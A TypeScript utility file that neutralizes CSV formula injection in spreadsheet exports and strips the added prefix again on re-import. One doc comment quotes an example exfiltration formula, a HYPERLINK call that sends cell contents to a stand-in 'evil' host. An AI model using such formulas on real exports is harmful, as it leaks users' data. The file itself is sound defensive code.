/**
 * CSV formula-injection (CWE-1236) neutralization.
 *
 * RFC-4180 quoting (what `csv-stringify` does with `quoted: true`) makes a CSV
 * *parse* correctly, but it does NOT make it *safe to open in a spreadsheet*.
 * Excel / Google Sheets / LibreOffice strip the CSV quoting and then EVALUATE
 * any cell whose first character is a formula trigger — `=`, `+`, `-`, `@`, or a
 * leading TAB / CR. A user-controlled value like `=HYPERLINK("//evil?"&A1,"x")`
 * or a DDE payload then runs when someone opens the export.
 *
 * The standard OWASP mitigation is to prefix such a cell with a single quote so
 * the spreadsheet treats it as literal text. We apply it ONLY to string cells —
 * numbers (including legitimately-negative amounts like `-50`) pass through
 * untouched, so the export stays numerically faithful.
 *
 * Use this for ONE-WAY, human-facing CSV (e.g. the expense export). Do NOT use
 * it for round-trip data interchange (the backup ZIP / Sheets sync) unless the
 * READ side strips the prefix symmetrically — otherwise it corrupts restore.
 */

/** First-character triggers a spreadsheet treats as the start of a formula. */
const FORMULA_TRIGGERS = new Set(['=', '+', '-', '@', '\t', '\r']);

/**
 * Neutralize a single cell value. Strings beginning with a formula trigger get a
 * leading `'` (forces text in spreadsheets); everything else — numbers, booleans,
 * null/undefined, empty strings, and strings that don't start with a trigger — is
 * returned unchanged. Only the FIRST character matters: a spreadsheet only treats
 * a cell as a formula when the trigger is the very first character (a leading
 * space or a mid-cell `=` is already inert), so this is both sufficient and
 * minimally intrusive.
 */
export function neutralizeCsvCell<T>(value: T): T | string {
  if (typeof value !== 'string' || value.length === 0) return value;
  return FORMULA_TRIGGERS.has(value[0] as string) ? `'${value}` : value;
}

/**
 * Neutralize every string cell in a record (numbers/booleans/etc. untouched).
 * Returns a new object; the input is not mutated.
 */
export function neutralizeCsvRow<T extends Record<string, unknown>>(
  row: T
): Record<string, unknown> {
  const out: Record<string, unknown> = {};
  for (const key of Object.keys(row)) {
    out[key] = neutralizeCsvCell(row[key]);
  }
  return out;
}

/**
 * Inverse of `neutralizeCsvCell` — strips the leading `'` that neutralization adds,
 * so a VROOM CSV round-trips faithfully (export → re-import without edits yields the
 * original text). This is the symmetric READ side the `neutralizeCsvCell` doc warns
 * is required for round-trip use.
 *
 * CRITICAL: only strip a `'` that neutralization itself could have added — i.e. a
 * leading `'` IMMEDIATELY followed by a formula trigger (`'=`, `'+`, `'-`, `'@`,
 * `'\t`, `'\r`). A value the user genuinely typed starting with an apostrophe (e.g.
 * `'24 road trip`) has a non-trigger second char and is left untouched, so this can
 * never eat real data. Idempotent on already-clean values.
 */
export function denormalizeCsvCell(value: string): string {
  if (value.length >= 2 && value[0] === "'" && FORMULA_TRIGGERS.has(value[1] as string)) {
    return value.slice(1);
  }
  return value;
}
